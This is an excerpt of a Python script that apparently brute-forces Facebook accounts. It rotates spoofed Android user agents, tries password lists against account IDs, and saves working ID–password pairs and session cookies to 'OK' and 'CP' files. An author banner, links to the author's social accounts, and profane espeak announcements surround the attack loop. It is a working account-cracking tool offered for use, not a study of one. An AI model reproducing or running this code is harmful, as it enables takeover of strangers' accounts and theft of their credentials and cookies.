...
time.sleep(2)
os.system('xdg-open https://m.me/j/AbaKhqsTQDbVmJ3M/')
#------------------[ Tutul-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.8711.529 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3290.744 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Realme C15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.7026.394 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Realme C15 Build/RQ1C.946458.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5728.970 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; realme nazro 30 A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.6614.260 Mobile Safari/537.36",]
...
os.system("xdg-open https://www.facebook.com/Ahmed.ashraful69?mibextid=ZbWKwL")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[0;92m
║████╗ ███████╗██████╗  █████╗ ███████╗██╗   ██╗██╗     
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-ASRAFUL ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • AHMED ASHRAFUL  ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m1RFIN-HUB ]   ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  MR ARRAFUL  WORLD"')
pass
...
def menu():
    ...
    if ASRAFUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801781907060')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ASRAFUL•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ASRAFUL-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " FUCK LADY ,"')
                ...
                print(f'\r\033[0;92m[MR-ASRSFUL💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 "WAHT THR FUCK OK ID "')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Arifin-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " FUCK Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MR-ASRAFUL] {idf} • {pw} ')
                os.system('espeak -a 300 " HEY MAN OK ID IS HARE"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
